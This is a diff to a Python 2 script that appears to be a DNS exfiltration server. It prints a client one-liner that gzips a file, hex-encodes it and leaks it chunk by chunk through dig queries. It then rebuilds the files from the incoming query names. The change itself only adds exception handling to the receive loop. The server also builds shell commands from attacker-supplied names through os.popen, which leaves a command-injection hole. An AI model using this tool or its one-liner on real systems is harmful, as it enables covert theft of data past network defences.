@@ -72,32 +72,34 @@ if __name__ == '__main__':
   print "\033[1;31m[#]\033[0m for b in $(gzip -c /path/to/file | xxd -p); do dig +short @%s $b.filename.ext.domain.com ; done ; dig +short @%s gunzip.filename.ext.domain.com\n" % (ip, ip)
  
   while 1:
+    try:      
+      data, addr = udp.recvfrom(1024)
+      p=DNSQuery(data)
+      udp.sendto(p.request(ip), addr)
+      print 'Request: %s -> %s' % (p.data_text, ip)
+
+      filename = ""
+
+      data = p.data_text.split(".")
+
+      for index,item in enumerate(data):
+        if(index < len(data) - 3):
+          if(index == 1):
+            filename = item
+          if(index > 1):
+            filename += "." + item
+
+      os.popen("mkdir -p data")
+
+      filename = "data/"+filename
+
+      if(data[0] != "gunzip"):
+        f = open(filename, "a")
       
-    data, addr = udp.recvfrom(1024)
-    p=DNSQuery(data)
-    udp.sendto(p.request(ip), addr)
-    print 'Request: %s -> %s' % (p.data_text, ip)
-
-    filename = ""
-
-    data = p.data_text.split(".")
-
-    for index,item in enumerate(data):
-      if(index < len(data) - 3):
-        if(index == 1):
-          filename = item
-        if(index > 1):
-          filename += "." + item
-
-    os.popen("mkdir -p data")
-
-    filename = "data/"+filename
-
-    if(data[0] != "gunzip"):
-      f = open(filename, "a")
-    
-      f.write(binascii.unhexlify(data[0]))
-	
-      f.close()
-    else: 
-      os.popen("mv " + filename + " " + filename + ".ori ; cat " + filename + ".ori | gunzip > " + filename)
+        f.write(binascii.unhexlify(data[0]))
+  	
+        f.close()
+      else: 
+        os.popen("mv " + filename + " " + filename + ".ori ; cat " + filename + ".ori | gunzip > " + filename)
+    except Exception: 
+      print "error"
